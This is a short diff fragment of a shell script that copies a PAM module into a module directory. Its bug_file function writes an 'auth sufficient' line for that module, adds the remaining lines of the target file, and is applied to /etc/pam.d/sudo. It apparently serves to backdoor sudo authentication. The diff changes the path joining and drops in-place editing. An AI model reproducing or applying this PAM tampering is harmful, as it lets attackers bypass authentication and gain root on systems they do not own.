@@ -50,7 +50,7 @@ cp ${PAM_OBJECT} ${MODULE_DIR}
 
 
 function bug_file(){
-    (echo "auth    sufficient    ${MODULE_DIR}/${PAM_OBJECT}"; sed -i '/.*'${PAM_OBJECT}'.*/d' $1)
+    (echo "auth    sufficient    ${MODULE_DIR}${PAM_OBJECT}"; sed '/.*'${PAM_OBJECT}'.*/d' $1)
 }
 
 bug_file /etc/pam.d/sudo
